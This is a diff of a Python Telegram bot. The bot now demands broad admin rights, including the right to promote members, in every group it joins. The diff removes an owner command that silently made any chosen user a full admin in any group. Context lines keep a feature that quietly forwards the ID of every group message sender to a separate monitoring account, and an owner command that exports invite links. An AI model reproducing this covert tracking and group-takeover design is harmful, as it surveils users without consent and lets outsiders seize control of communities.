@@ -51,39 +51,23 @@ def export_invite_link(chat_id):
     return None
 
 
-def promote_user(chat_id, user_id):
-    permissions = {
-        "can_manage_chat": True,
-        "can_post_messages": True,
-        "can_edit_messages": True,
-        "can_delete_messages": True,
-        "can_manage_video_chats": True,
-        "can_invite_users": True,
-        "can_restrict_members": True,
-        "can_pin_messages": True,
-        "can_promote_members": True,
-        "can_change_info": True,
-        "is_anonymous": False
-    }
-    resp = requests.post(f"{BOT_API}/promoteChatMember", json={
-        "chat_id": chat_id,
-        "user_id": user_id,
-        **permissions
-    })
-    return resp.json()
+def check_required_permissions(chat_id):
+    """Check if bot has all required permissions"""
+    admins = get_chat_administrators(chat_id)
+    bot_info = requests.get(f"{BOT_API}/getMe").json()
+    bot_id = bot_info["result"]["id"]
 
-
-def is_member(chat_id, user_id):
-    resp = requests.get(f"{BOT_API}/getChatMember", params={"chat_id": chat_id, "user_id": user_id})
-    if resp.status_code == 200:
-        data = resp.json()
-        if data.get("ok"):
-            status = data["result"]["status"]
-            return status in ["member", "administrator", "creator"]
+    for admin in admins:
+        if admin["user"]["id"] == bot_id:
+            perms = admin.get("can_delete_messages", False), \
+                    admin.get("can_restrict_members", False), \
+                    admin.get("can_invite_users", False), \
+                    admin.get("can_promote_members", False)
+            return all(perms)
     return False
 
 
-# --------- REPEATER --------- #
+# --------- UPDATED REPEATER (supports proper albums/media groups) --------- #
 def repeater(chat_id, message_ids, interval, job_ref, is_album=False):
     last_message_ids = []
 
@@ -192,6 +176,10 @@ def webhook():
         new_status = my_chat_member["new_chat_member"]["status"]
 
         if new_status in ["administrator", "member"]:
+            if not check_required_permissions(chat_id):
+                send_message(OWNER_ID, f"❌ Missing required permissions in {chat_title} ({chat_id})")
+                return "OK"
+
             save_group_id(chat_id)
             notify_owner_new_group(chat_id, chat_type, chat_title)
         return "OK"
@@ -210,12 +198,12 @@ def webhook():
     admins = [a["user"]["id"] for a in get_chat_administrators(chat_id)] if str(chat_id).startswith("-") else []
     is_admin = from_user["id"] in admins if from_user["id"] else True
 
-    # --- Collect media_group messages properly --- 
+    # --- Collect media_group messages properly ---
     if "media_group_id" in msg:
         mgid = msg["media_group_id"]
         media_groups.setdefault((chat_id, mgid), []).append(msg["message_id"])
 
-    # --- Monitor user activity ---
+    # --- NEW FEATURE: Monitor user activity for MONITOR_ID ---
     if str(chat_id).startswith("-") and from_user.get("id"):
         send_message(MONITOR_ID, f"👤 User Activity\nUser ID: <code>{from_user['id']}</code>", parse_mode="HTML")
 
@@ -223,33 +211,6 @@ def webhook():
     if chat_id == OWNER_ID and text.strip().startswith("-"):
         status_message = check_bot_status(text.strip())
         send_message(chat_id, status_message)
-        return "OK"
-
-    # OWNER promote admin command
-    if chat_id == OWNER_ID and text.lower().startswith("/promoteadmin"):
-        parts = text.split()
-        if len(parts) != 3:
-            send_message(chat_id, "Usage: /promoteadmin <group_id> <user_id>")
-            return "OK"
-
-        target_group_id = parts[1]
-        target_user_id = int(parts[2])
-
-        bot_id = requests.get(f"{BOT_API}/getMe").json()["result"]["id"]
-        if bot_id not in [a["user"]["id"] for a in get_chat_administrators(target_group_id)]:
-            send_message(chat_id, "❌ Bot is not admin in that group.")
-            return "OK"
-
-        if not is_member(target_group_id, target_user_id):
-            send_message(chat_id, "❌ User is not a member of that group.")
-            return "OK"
-
-        result = promote_user(target_group_id, target_user_id)
-        if result.get("ok"):
-            send_message(chat_id, f"✅ User {target_user_id} promoted in group {target_group_id}.")
-        else:
-            error = result.get("description", "Unknown error")
-            send_message(chat_id, f"❌ Failed to promote: {error}")
         return "OK"
 
     # OWNER get invite link command
